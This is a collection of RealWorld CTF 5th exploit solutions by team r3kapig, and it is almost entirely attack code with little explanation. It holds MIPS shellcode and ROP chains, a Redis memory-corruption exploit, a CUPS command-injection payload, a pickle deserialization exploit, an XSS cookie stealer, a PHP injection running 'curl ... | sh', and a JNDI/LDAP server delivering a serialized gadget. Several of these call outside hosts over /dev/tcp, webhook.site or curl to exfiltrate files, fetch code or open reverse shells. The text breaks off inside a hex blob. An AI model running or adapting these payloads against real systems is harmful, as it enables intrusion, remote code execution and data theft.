# RealWorld CTF 5th Writeup by r3kapig

> 原文: https://www.ctfiot.com/130660.html
> ID: 130660


```
from pwn import *

def pb32(a):
    return p32(a, endian='big')

def be(sc: bytes):
    final = b''
    for x in range(0, len(sc), 4):
        final += sc[x:x + 4][::-1]
    return final

debug = 0
context.arch = 'mips'

if debug:
    # qemu udp hostfwd sucks
    s1 = ssh(user='root', host='localhost', port=5555, password='admin')
    p = s1.process(['nc', '-u', '127.0.0.1', '62720'])
else:
    p1 = remote('47.89.210.186', 57798)
    p1.sendlineafter(b'now:', b't7h0SsXRQLijNOBePkFPMg==')
    p1.recvuntil(b'port is : ')
    port = int(p1.recvuntil(b' ', drop=1))
    log.success(f'Port: {port}')
    sleep(60)
    context.log_level = 'debug'
    p = remote('47.89.210.186', port, typ='udp')

payload = b'FIVI' + p32(0x12345678) + b'x0a' + p16(1) + p16(0xabcd) + b'xff' * 4 + b'xff' * 6 + p16(0) + p32(0)
p.send(payload)
p.recv(17)
mac = p.recv(6)
p.recv()
payload = b'FIVI' + b'x10x00x00xe7' + b'x0a' + p16(2) + p16(0xabcd) + b'xff' * 4 + mac + p16(0) + p32(0x8E)
payload = payload.ljust(93, b'x00')
r = b'a' * 580
r += pb32(0x00413011) * 2
r += pb32(0x402ac0)
r += b'x00' * 16
r += pb32(0x41b038)
r += b'x00' * 8
r += pb32(0x0040208c)
r += b'x10x00x00x09'
r += b'x00' * 0x14
r += pb32(0x41afd8)
r += pb32(0)
r += b'x41x30x14x03xa0xf8x09x00'

context.endian = 'big'
#    {shellcraft.mips.read('$v0','$sp',0x1000)}
buf = asm(f'''
    addiu $sp, $sp, -0x1000
    {shellcraft.mips.open('/firmadyne')}
    {shellcraft.mips.linux.syscall('SYS_getdents','$v0','$sp',0x1000)}

    {shellcraft.mips.mov('$a0', 3)}
    {shellcraft.mips.mov('$a1', '$sp')}
    {shellcraft.mips.mov('$a2', 0x1000)}
    {shellcraft.mips.mov('$a3', 0)}
    {shellcraft.mips.mov('$v0', 0x0413170)}
    sw      $v0, 16($sp)
    {shellcraft.mips.mov('$v0', 0x10)}
    sw      $v0, 20($sp)
    {shellcraft.mips.mov('$gp', 0x41b030)}
    {shellcraft.mips.mov('$t0', 0x00402940)}
    jalr $t0
    nop
    {shellcraft.mips.linux.exit(0)}
    ''')
r += buf
payload += b64e(r).encode()
p.send(payload)
p.interactive()
```



```
from pwn import *

def pb32(a):
    return p32(a, endian='big')

def be(sc: bytes):
    final = b''
    for x in range(0, len(sc), 4):
        final += sc[x:x + 4][::-1]
    return final

debug = 0
context.arch = 'mips'

if debug:
    # qemu udp hostfwd sucks
    s1 = ssh(user='root', host='localhost', port=5555, password='admin')
    p = s1.process(['nc', '-u', '127.0.0.1', '62720'])
else:
    p1 = remote('47.89.210.186', 57798)
    p1.sendlineafter(b'now:', b't7h0SsXRQLijNOBePkFPMg==')
    p1.recvuntil(b'port is : ')
    port = int(p1.recvuntil(b' ', drop=1))
    log.success(f'Port: {port}')
    sleep(60)
    context.log_level = 'debug'
    p = remote('47.89.210.186', port, typ='udp')

payload = b'FIVI' + p32(0x12345678) + b'x0a' + p16(1) + p16(0xabcd) + b'xff' * 4 + b'xff' * 6 + p16(0) + p32(0)
p.send(payload)
p.recv(17)
mac = p.recv(6)
p.recv()
payload = b'FIVI' + b'x10x00x00xe7' + b'x0a' + p16(2) + p16(0xabcd) + b'xff' * 4 + mac + p16(0) + p32(0x8E)
payload = payload.ljust(93, b'x00')
r = b'a' * 580
r += pb32(0x00413011) * 2
r += pb32(0x402ac0)
r += b'x00' * 16
r += pb32(0x41b038)
r += b'x00' * 8
r += pb32(0x0040208c)
r += b'x10x00x00x09'
r += b'x00' * 0x14
r += pb32(0x41afd8)
r += pb32(0)
r += b'x41x30x14x03xa0xf8x09x00'

context.endian = 'big'
#    {shellcraft.mips.read('$v0','$sp',0x1000)}
buf = asm(f'''
    addiu $sp, $sp, -0x1000
    {shellcraft.mips.open('/firmadyne/flag')}
    {shellcraft.mips.read('$v0','$sp',0x1000)}

    {shellcraft.mips.mov('$a0', 3)}
    {shellcraft.mips.mov('$a1', '$sp')}
    {shellcraft.mips.mov('$a2', 0x1000)}
    {shellcraft.mips.mov('$a3', 0)}
    {shellcraft.mips.mov('$v0', 0x0413170)}
    sw      $v0, 16($sp)
    {shellcraft.mips.mov('$v0', 0x10)}
    sw      $v0, 20($sp)
    {shellcraft.mips.mov('$gp', 0x41b030)}
    {shellcraft.mips.mov('$t0', 0x00402940)}
    jalr $t0
    nop
    {shellcraft.mips.linux.exit(0)}
    ''')
r += buf
payload += b64e(r).encode()
p.send(payload)
p.interactive()
```



```
from pwn import *
context.log_level="debug"
p = remote("47.89.253.219",2121)
def se(cmd):
    p.send(f"{cmd}rn".encode())
def rl():
    return p.recvuntil(b"n")
def ru(delim):
    return p.recvuntil(delim)
def pasv():
    se("PASV")
    port_resp = rl()[len("227 Entering Passive Mode (0,0,0,0,"):].decode()
    port1 = int(port_resp[:port_resp.find(",")])
    port2 = int(port_resp[port_resp.find(",")+1:port_resp.find(")")])
    port = (port1<<8)+port2
    return port

rl()
se("USER anonymous")
rl()
se("PASS ttt")
rl()

pasv_port = pasv()
print(pasv_port)
se("LIST")
USER("/")
rl()
rl()
# nc port here to get the flag name
flag_name = input()
se("RETR hello.txt")
se("USER "+flag_name)
rl()
rl()
# nc port here to get the flag
```



```
#!/usr/bin/env python3
import socket
import ctypes, struct
import os, time

class FakeRemote:
    def __init__(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((host, port))
    
    def send(self, data):
        if isinstance(data, str):
            data = data.encode('ascii')
        self.s.send(data)

    def recv(self, length):
        data = b''
        while len(data) < length:
            recv = self.s.recv(length - len(data))
            if not recv:
                raise EOFError
            data += recv
        return data

    def recvall(self):
        data = b''
        while True:
            recv = self.s.recv(0x1000)
            if not recv:
                break
            data += recv
        return data
    
    def recvuntil(self, until, drop=False):
        data = b''
        while not data.endswith(until):
            recv = self.s.recv(1)
            if not recv:
                raise EOFError
            data += recv
        return data[:-len(until)] if drop else data

    def info(self, s):
        print(f'[*] {s}')
    
    def success(self, s):
        print(f'[+] {s}')
    
    def close(self):
        self.s.close()
def query(qs):
    def _query(q):
        if isinstance(q, str):
            q = q.encode('ascii')
        
        if isinstance(q, (list, tuple)):
            p.send(f'*{len(q)}rn'.encode('ascii'))
            for qe in q:
                _query(qe)
        else:
            assert isinstance(q, (bytes, bytearray))
            p.send(f'${len(q)}rn'.encode('ascii') + q + b'rn')
    
    def _resp():
        first = p.recv(1)
        if first == b'+':
            return p.recvuntil(b'rn', drop=True)
        elif first == b'-':
            err = p.recvuntil(b'rn', drop=True)
            raise RuntimeError(f'Redis returned Error: {err}')
        elif first == b':':
            return int(p.recvuntil(b'rn', drop=True))
        elif first == b'$':
            length = int(p.recvuntil(b'rn', drop=True))
            data = p.recv(length)
            assert p.recv(2) == b'rn'
            return data
        else:
            assert first == b'*'
            length = int(p.recvuntil(b'rn', drop=True))
            return [_resp() for _ in range(length)]
    
    if isinstance(qs, str):
        qs = qs.encode('ascii')
    
    if isinstance(qs, (bytes, bytearray)):
        p.send(qs + b'rn')
    else:
        _query(qs)
    
    return _resp()
def query_addr(obj):
    return int(query(f'''debug object {obj}''').split()[1][3:], 16)
def p64(v, endian='little'):
    return struct.pack('<Q' if endian=='little' else '>Q', v)
def u64(v, endian='little'):
    return struct.unpack('<Q' if endian=='little' else '>Q', v)[0]

HOST, PORT = "127.0.0.1", 6379
LHOST, LPORT = "192.168.1.7", 666

#bash_cmd = f'cat /flag* > /dev/tcp/{LHOST}/{LPORT}'
bash_cmd = f"/readflag > /dev/tcp/{LHOST}/{LPORT}"

cmds = [#   '0123456789abcdef0123456789ab'
    "echo '#!/bin/bash'>/tmp/a",
] + [
    f"echo -n '{bash_cmd[st:st+9]}'>>/tmp/a" for st in range(0, len(bash_cmd), 9)
] + [
    "chmod 777 /tmp/a",
    "/tmp/a"
]

assert all(len(cmd) <= 0x1c for cmd in cmds)
cmds = [cmd.ljust(0x1c, ' ') for cmd in cmds]

p = FakeRemote(HOST, PORT)

assert query('''debug mallctl background_thread 0''') in (0, 1)  # 1: first run, 0: following runs
for i in range(len(cmds)):
     query(f'''setbit K{i} 400000 0''')
# can be replaced with "set I0 0" => "debug object I0"

leak = query('''debug mallctl arena.0.extent_hooks''')
libc_base = leak - 0x7c0a00

print("leak: ", hex(leak))
print(hex(libc_base))

assert libc_base & 0xfff == 0
libssl_base = libc_base + 0x66a000

# for each cmds, try 0x100 times to get adjacent embstr
cmd_addrs = []
for i in range(len(cmds)):
    for j in range(0x100):
        assert query(['set', f'cmd{i}_{j}', cmds[i]]) == b'OK'
        assert query(['set', f'sys{i}_{j}',
            p64(libc_base + 0x50d60).ljust(0x1c)
        ]) # system@libc offset
        cmd_addr, sys_addr = query_addr(f'cmd{i}_{j}'), query_addr(f'sys{i}_{j}')
        if sys_addr == cmd_addr + 0x30:
            print("find!!")
            break
    else:
        assert False
    cmd_addrs.append(cmd_addr)

# 0x0000000000035ae0 : mov rdi, qword ptr [rdi] ; jmp qword ptr [rdi + 0x30]
# 0x000000000002f3f4 : mov rdi, qword ptr [rdi] ; jmp qword ptr [rdi + 0x30]
for i in range(len(cmds)):
    cmd, cmd_addr = cmds[i], cmd_addrs[i]

    assert query(['set', 'extent_hook',
        p64(cmd_addr+0x13)+p64(libssl_base+0x000000000002f3f4)
    ]) == b'OK'
    extent_hook_addr = query_addr('extent_hook')

    original_extent_hook = query(f'''debug mallctl arena.0.extent_hooks {extent_hook_addr+0x13}''')
    query(f'''del K{i}''')
    assert query('''memory purge''') == b'OK'  # command executed!

    # cleanup :)
    assert query(f'''debug mallctl arena.0.extent_hooks {original_extent_hook}''') == extent_hook_addr+0x13

assert query('flushall') == b'OK'
assert query('memory purge') == b'OK'

p.close()
```



```
snprintf(cmdline, sizeof(cmdline),
             "%s/backend/%s '%s' '%s' '%s' '%s' '%s' %s",
             cups_serverbin, scheme, argv[1], argv[2], argv[3],
             /* Apply number of copies only if beh was called with a
                file name and not with the print data in stdin, as
                backends should handle copies only if they are called
                with a file name */
             (argc == 6 ? "1" : argv[4]),
             argv[5], filename);

 /*
  * Overwrite the device URI and run the actual backend...
  */

  setenv("DEVICE_URI", uri, 1);

  fprintf(stderr,
          "DEBUG: beh: Executing backend command line "%s"...n",
          cmdline);
  fprintf(stderr,
          "DEBUG: beh: Using device URI: %sn",
          uri);

  retval = system(cmdline) >> 8;

  if (retval == -1)
    fprintf(stderr, "ERROR: Unable to execute backend command line: %sn",
            strerror(errno));

  return (retval);
```



```
request = ippNewRequest(IPP_OP_PRINT_JOB);
ippAddString(request, IPP_TAG_OPERATION, IPP_TAG_URI, "printer-uri", NULL, ldata.uri);

ippAddString(request, IPP_TAG_OPERATION, IPP_TAG_NAME, "requesting-user-name", NULL, "' ;bash -c 'cat /flag >&/dev/tcp/ip/port'; '");

if ((name = strrchr(ldata.docfile, '/')) != NULL)
    name ++;
else
    name = ldata.docfile;

ippAddString(request, IPP_TAG_OPERATION, IPP_TAG_NAME, "job-name", NULL, name);

    
response = cupsDoFileRequest(http, request, ldata.resource, ldata.docfile);
```



```
[pid 509956] execve("/usr/lib/cups/backend/beh", ["beh:/1/3/5/socket://printer:9100", "57", "' ' ;bash -c 'cat /flag >&/dev/tcp/ip/port'; ' '", "test2.txt", "1", "job-uuid=urn:uuid:2dd5abdc-ada5-3e64-7788-7322c477d818 job-originating-host-name=172.17.0.1 date-time-at-creation= date-time-at-processing= time-at-creation=1673159696 time-at-processing=1673159696", "/var/spool/cups/d00057-001"], 0x7ffc7bc7b780 /* 28 vars */) = 0                                                                                                                                                                                                           
strace: Process 509957 attached                                                                                                                               
[pid 509957] execve("/bin/sh", ["sh", "-c", "/usr/lib/cups/backend/socket '57' '' ;bash -c 'cat /flag >&/dev/tcp/ip/port';'' 'test2.txt' '1' 'job-uuid=urn:uuid:2dd5abdc-ada5-3e64-7788-7322c477d818 job-originating-host-name=172.17.0.1 date-time-at-creation= date-time-at-processing= time-at-creation=1673159696 time-at-processing=1673159696' /var/spool/cups/d00057-001"], 0x7ffc6af09948 /* 28 vars */) = 0
```



```
from pwn import *
s=remote("198.11.180.84",6666)

# 0x12e0bd
payload = '''
start:
    add esp, 0x401de60
    pop eax
    prn eax
    sub esp, 0xe60
    sub eax, 0x12e0bd
    sub eax, 0x10
    add eax, 0x20
    add esp, 0xa8
    push eax
    add esp, 0x165c
    mov rcx,0
    push rcx
    add esp, 0x28
    push rcx
    push rcx
    push rcx
    mov eax,1
    prn eax
    ret
'''
payload = payload.strip()
print(payload)
s.recvuntil("Input the size of the vm file you want to run(< 4096) :")
s.sendline(str(len(payload)))
s.send(payload)

s.interactive()
```



```
paddle-serving-server==0.9.0 
    paddle-serving-client==0.9.0 
    paddle-serving-app==0.9.0 
    paddlepaddle==2.3.0
```



```
(paddle_serving_server/pipeline)
operator.py:1753 np_data = np.load(byte_data, allow_pickle=True)
operator.py:1763 unpack_request_package(self, request)
dag.py:799 unpack_func = op.unpack_request_package (in _build_dag)
dag.py:814 build(self)
dag.py:94 (in_channel, out_channel, pack_rpc_func,unpack_rpc_func) = self._dag.build()
dag.py:306 dictdata, log_id, prod_errcode, prod_errinfo = self._unpack_rpc_func(rpc_request)
dag.py:374 req_channeldata = self._pack_channeldata(rpc_request, data_id) (in call)
pipeline_server.py:73 resp = self._dag_executor.call(request)
```



```
/*
import pickle
import sys
import base64

PAYLOAD = """
import os
import requests
flag = os.popen('cat /flag').read()
url = 'https://webhook.site/bb7ecf40-cae3-42e1-9eea-79af431c1cf9/' + flag
requests.get(url)
"""

class RCE:
  def __reduce__(self):
    return exec, (PAYLOAD,)

if __name__ == '__main__':
  pickled = pickle.dumps(RCE())
  with open('payload', 'wb') as f:
    f.write(pickled)

*/
import { execSync } from "child_process";
import { readFileSync } from "fs";

execSync(`python3 exploit.py`);

const payload = readFileSync("payload").toString("base64");

const resp = await fetch("http://47.88.23.73:33085/uci/prediction", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    key: ["x"],
    value: [
      "0.0137, -0.1136, 0.2553, -0.0692, 0.0582, -0.0727, -0.1583, -0.0584, 0.6283, 0.4919, 0.1856, 0.0795, -0.0332",
    ],
    tensors: [
      {
        name: "A",
        elem_type: "13",
        byte_data: payload,
      },
    ],
  }),
});
console.log(await resp.text());
```



```
<img src=1 onerror="a=new Image();a.src='https://ricterz.me/?'+document.cookie;document.getElementsByTagName('body')[0].appendChild(a)">
```



```
http://127.0.0.1");}public function getURL(){return 1;}public function asd(){//
```



```
POST /api.php HTTP/1.1
Content-Length: 209
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=6ufrd768dfdbfe8lnf8onv2qc5
Host: 47.89.249.223

URL=http://127.0.0.1");}}%0a%25{
#define A curl static.ricterz.me/reverse/|sh
#define _A(str) _TMP(str)
#define _TMP(str) #str
#define RETURN_STRING(a) system(_A(A))
}%25function a(){if false{var ch=0;//
```



```
<iframe src="http://localhost:12345/post/?id=57b7d5e1-fdfc-44a4-aca7-bbdddee09b6c?callback=parent.opener.document.body.children[0].children[0].children[0].children[1].children[0].click%26xx=%d8%00"></iframe>
```



```
<arg0 xsi:type="xs:base64Binary"><xop:Include href="file:////opt/tomcat/webapps/ROOT.war"/></arg0>
```



```
GET /7he_d4rk_p0rt4l?curses=xxxxx HTTP/1.1
User-Agent: The Argent Dawn
cmd: /readflag
Host: 198.11.177.96
```



```
{
   "bootstrap.servers": "117.50.188.49:9092"
   "security.protocol": "SASL_SSL",
   "sasl.jaas.config" : "com.sun.security.auth.module.JndiLoginModule required user.provider.url=/"rmi://117.50.188.49:1234/EvilObject" useFirstPass="true" serviceName="x"  group.provider.url="a";"
}
```



```
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.ParseException;

public class LdapServer {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main (String[] args) {

        String url = "http://127.0.0.1:8000/#EvilObject";
        int port = 1234;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        /**
         *
         */
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }

            // Payload1: 利用LDAP+Reference Factory
//            e.addAttribute("javaCodeBase", cbstring);
//            e.addAttribute("objectClass", "javaNamingReference");
//            e.addAttribute("javaFactory", this.codebase.getRef());

            // Payload2: 返回序列化Gadget
            try {
                e.addAttribute("javaSerializedData", Base64.decode("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAABs3K/rq+AAAANAA8CgAKACsKACwALQcALggALwgAMAgAMQoALAAyBwAzBwA0BwA1AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMdGVzdDsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAQTWV0aG9kUGFyYW1ldGVycwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwA2AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAzAQAKU291cmNlRmlsZQEACXRlc3QuamF2YQwACwAMBwA3DAA4ADkBABBqYXZhL2xhbmcvU3RyaW5nAQAJL2Jpbi9iYXNoAQACLWMBADAvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTE3LjUwLjE4OC40OS8xMjM1IDA+JjEMADoAOwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAR0ZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACQAKAAAAAAAFAAEACwAMAAEADQAAAC8AAQABAAAABSq3AAGxAAAAAgAOAAAABgABAAAABgAPAAAADAABAAAABQAQABEAAAAJABIAEwACAA0AAAArAAAAAQAAAAGxAAAAAgAOAAAABgABAAAAEgAPAAAADAABAAAAAQAUABUAAAAWAAAABQEAFAAAAAEAFwAYAAMADQAAAD8AAAADAAAAAbEAAAACAA4AAAAGAAEAAAAXAA8AAAAgAAMAAAABABAAEQAAAAAAAQAZABoAAQAAAAEAGwAcAAIAHQAAAAQAAQAeABYAAAAJAgAZAAAAGwAAAAEAFwAfAAMADQAAAEkAAAAEAAAAAbEAAAACAA4AAAAGAAEAAAAcAA8AAAAqAAQAAAABABAAEQAAAAAAAQAZABoAAQAAAAEAIAAhAAIAAAABACIAIwADAB0AAAAEAAEAHgAWAAAADQMAGQAAACAAAAAiAAAACAAkAAwAAQANAAAAagAFAAEAAAAfuAACBr0AA1kDEgRTWQQSBVNZBRIGU7YAB1enAARLsQABAAAAGgAdAAgAAwAOAAAAEgAEAAAACQAaAAwAHQAKAB4ADQAPAAAADAABAB4AAAAlACYAAAAnAAAABwACXQcAKAAAAQApAAAAAgAqcHQAEkhlbGxvVGVtcGxhdGVzSW1wbHB3AQB4cQB+AA14"));
            } catch (ParseException exception) {
                exception.printStackTrace();
            }

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```



```
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5, ARC4
from Crypto.Random import get_random_bytes
import re
from pwn import *
from Crypto.Util.Padding import pad, unpad

# =========== RSA ===========
def rsa_server_decrypt(enc_msg):
    server_privkey = open('server_private.pem', 'rb').read()
    server_key = RSA.import_key(server_privkey)
    sentinel = get_random_bytes(16)
    cipher = PKCS1_v1_5.new(server_key)
    return cipher.decrypt(enc_msg, sentinel, expected_pt_len=16)

def rsa_client_decrypt(enc_msg):
    client_privkey = open('client_private.pem', 'rb').read()
    client_key = RSA.import_key(client_privkey)
    sentinel = get_random_bytes(16)
    cipher = PKCS1_v1_5.new(client_key)
    return cipher.decrypt(enc_msg, sentinel, expected_pt_len=16)
# =========== RSA ===========

# =========== AES ===========
def aes_decrypt(key, iv, data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    try:
        return(unpad(cipher.decrypt(data), AES.block_size))
    except:
        return(cipher.decrypt(data))
# =========== AES ===========

reg = re.compile(b'x00x00x00.x00x00x00x01x00x00x00.',re.DOTALL)
cipher = ARC4.new(b'explorer')
x = cipher.decrypt(bytes.fromhex('612cb832389a79ecfb1cf1e6804a111a56e2315f03f2d3ed3a72edab5b9d27d39076f9f5c92c021e07d197073236e5162bfe0271f220cabb514156b881576ce12aa461381627acd023445d15bc7f581eb1d59322d3d0b1ef5917937314d25c28e332db48ea761b4a9167d3558a2f7367315c84fa6f46c62a1e6eb191cf154f150ffe30713e5591e5404b71f0d4a0a23643a154a05a958251cbcfd737c0e4ae20089105e1f793504f9ed9e89c7d3007cab34746abb4276abb90dece2a388d13102c23320d9425beb52beda89e1a166d435e00e9ee5d31cf572cf6b5e7f3eac72c629892a068c0c372a1eeb43e9f23198da4e1cb1044e0faccaa684b18c474f6cb334ad6522f287f1102614d632cb8bc9d41a99b8abc1b1f4f824ab8cbef177576c339780cbd3c149e478a724b0b8f019b107427ee2de217703f7ec65ce6c367983966472787c6a0fe61d6b43a9ea40f5cd3921b6430717f006061ba535ca827fae13d974c3f52d726968bc6944b76f19640857776152f674a614229e9164e8ee3b797c4bd425689515e76a6ce06e84e2fd7e103f6e2853f07918d1884d42a1e912ffd8d2f2b1a2400960ebe423b55d7f855ee79e31614577ddc6b6d1dd6c9da90eeaac8fb8e1be67f3a6dfd3080e100116056eba83edf82730303d65a6655d8c817afd5149f1a1e8b0c066d7e7f08aa7edc24378cd51d174d2079c4ca3e9e3265092c5a8c880f8cfafaf341b6c7062410f8e91a5c403fcacefe0974ae7f6b373c16ffcf6fcb1eb9eec0f114fb2d60f79e81e09da07e4e589821c8183e1aac2b00aa298a072ebd0fdfca26c161cbf1716fee59ed1f00d7d2b726f759ce43d0d31b812b909879f0a6934087d6264dbf913b885fd9b7e8802fa6b17a09e180f109f1776ef56569edbb60420d7a38f8bed800fa6978447765a81e6ed2dc1e1b9f4c38e9778638d8247c1604e9afa6b6a40cd0332511abaa0e66e9c2644e305278753fea68d8afdb36ca3e1abf91f5776c6a7b892625ee9cbe97ef7fbd771def03f1fe7f49b049ed3377445fcd48dad466835ac2b2c730619a7424bec7674e38b8145299aeda42a45fba9b322fed3fda1c1dd12b1b8cb529f3fdec99f347db198434b4e3e603d65df3c75b83b81009b9d96f36f04e20d3b52a4f01bd0a5c808647c1ac69f4ef1c91814ef54e7fcc5f65e7be1dd76b53c680da3bcbac617efd2ba37f90e924adb4547ca1106a0197f7b8b1211f6c911fe7a019fdf358ad992dffccc5b7fdb6b01b8203efd359491367ae7e273a50eb9cda0d2c4b4216658f9d86f7c916b7dcb1d2e20f131c55dfa4b84ca78e97c8ec9a79737232ebc95d25c169f9ae7552bcbf4046424e79acbb16834c24b3f60b62dbe63cd4508d450bb5a1c1ac9efe05c1eb3ce3471f21844be15ef09633423b3dd98c161e367645831acedcd9022f4b9fc55c22ac10597d5d824ac76c6a7c695aefebd9f652f854f40e5504060b9c1424577587ea64b554dc7f0c99271311504c343fe8ec257ea090d493fe23d90f78554b57b380a5c56ca1f69725061890bc9120085444c7025a6d59a959625abb0fdf986ca36362a9cb9ad53213f09ba22efde355b87200c88a5032bbddbf6454a2d98c32a7d19b31fa710d4913cd645e624b364590f846ad0eff05ece6ccaabeb937b42974f9eae9aae45cd29b6a5820f350e255b6e2d0bd34721d5f426e920fd4a23118def8eb2e6b66a92070b4e3b544424cc67df5ce94728bc3176fc4bfe7645fe7a419e5741342c0fd6d0226905519d2f2482fc506c28071e64af0d40b7d6d3970af2e832d9ae786b9abf89cbb319c77827cff84289e56a5a3dc84ef7320f7084697a1b69fd1a06a7b8e1ec261bbde176f43c642383ddf08ce520e5a2c1acee40a266e0bfa612e071c04ddea39b001c0240e8e5f989236993dc1bf1513e186e767a26136a58b07630381def1244d604dc95fe16a44c88d12c41a57880ebc6da9e0333d07e8003ea8ce7757622a2a4b1d5a7d47c9845ad7b5ca49fd4e62d00aa91f64962c33bf1f3958fb4fd13fb26f0035aded8cdd2b8aebe34fcf424521c00959cd3effc21874f7813fa3fde7200d15e796e409b5c033eb12dda87c01e1fe7cdfc0df4369f7147c1b449bc3a09cdc5eaa1cf288e91e8672c572e73ceb965763222338f1a6d035a54394366ce2bf74f4b17560548c6da51aca61e2b4dd32e08d487aa2a23ee279468c98e